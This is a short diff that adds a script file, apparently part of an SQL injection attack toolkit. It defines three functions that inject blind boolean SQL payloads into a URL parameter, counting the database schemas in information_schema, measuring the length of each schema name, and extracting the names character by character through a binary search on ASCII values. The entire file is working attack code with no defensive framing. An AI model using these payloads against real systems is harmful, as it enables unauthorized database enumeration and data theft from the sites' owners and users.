@@ -1,0 +1,11 @@
+#include ATTACKUTILS/SQLAttack.wker
+
+function GetDataBaseNum(url,length,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >",length);
+}
+function GetDataBaseLength(url,length,DataBaseindex,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1))) >",length);
+}
+function GetDataBaseStr(url,length,DataBaseindex,StringIndex,ArgDefalutText){
+	return AsciiToChar(dichotomy(url,ArgDefalutText." and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1),".StringIndex.",1)))>",length));
+}
